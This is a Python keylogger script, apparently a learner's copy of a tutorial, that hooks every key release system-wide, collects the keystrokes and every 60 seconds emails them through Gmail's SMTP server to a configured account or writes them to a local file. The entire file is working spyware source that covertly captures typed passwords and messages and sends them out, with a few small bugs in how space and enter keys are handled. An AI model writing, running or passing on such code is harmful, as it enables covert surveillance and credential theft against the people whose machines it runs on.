import keyboard # for keylogs
import smtplib # for sending emails using SMTP protocol (gmail)

from threading import Timer #Timer is used to make a method run after an interval of time
from datetime import datetime

SEND_REPORT_EVERY = 60 
EMAIL_ADDRESS = "email"
EMAIL_PASSWORD = "password"

class Keylogger:
    
    def __init__(self, interval, report_method="email"):
        #pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        #self.log contains the log of all keystrokes within self.interval
        self.log = ""
        #record start and end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        #This callback is invoked whenever a keyboard event occurs
        name = event.name
        if len(name) > 1:
            #not a character, AKA a special key
            if name == "space":
                #instead of "space"
                name == " "
            elif name == "enter":
                #adds a new line whenever enter is pressed
                name == "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #replace spaces with underscores?
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]" #not sure what this does
        #finally, add the key name to the global 'self.log' variable
        self.log += name #whenever a key is pressed the character is appended to the self.log string
    
    def update_filename(self): #report the keylog to a local file
        #construct the filename to be identified by start and end times
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        #creates a log file in current directory from self.log variable
        with open(f"{self.filename}.txt", "w") as f:
            #write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message): #sending the file through email
        #manages connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        #connects to the SMTP server as TLS mode (for security)
        server.starttls()
        #login to the email account
        server.login(email,password)
        #send the message
        server.sendmail(email, email, message)
        #terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every 'self.interval'
        It sends keylogs and resets 'self.log variable
        """
        if self.log:
            #if there is something in the log, report it
            self.end_dt = datetime.now()
            #update 'self.filename'
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        #set the thread as daemon (dies when main thread dies)
        timer.daemon = True
        #start the timer
        timer.start()

    def start(self):
        #record the start datetime
        self.start_dt = datetime.now()
        #start the keylogger
        keyboard.on_release(callback=self.callback)
        #start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    #if you want keylogger to send to your email, uncomment below
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    #if you want keylogger to record keylogs to a local file, uncomment below
    """keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")"""
    keylogger.start()
